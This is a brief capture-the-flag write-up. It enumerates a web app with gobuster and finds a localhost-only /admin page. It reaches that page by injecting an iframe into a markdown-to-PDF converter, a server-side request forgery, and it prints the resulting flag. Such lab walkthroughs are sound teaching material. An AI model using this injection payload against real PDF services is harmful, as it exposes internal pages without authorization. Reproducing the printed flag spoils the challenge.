## 1. Access

- Open target IP in browser.
    
- Test if PDF generation works with simple markdown.
    

## 2. Enumeration

`gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt`

- Finds `/admin`.
    

## 3. Restriction

- Visiting `/admin` → blocked: _only accessible from localhost:5000_.
    

## 4. Exploit

- Inject HTML in markdown:
    

`<iframe src="http://localhost:5000/admin"></iframe>`

## 5. Result

- Convert to PDF.
    
- Open → flag is embedded:
    

`flag{1f4a2b6ffeaf4707c43885d704eaee4b}`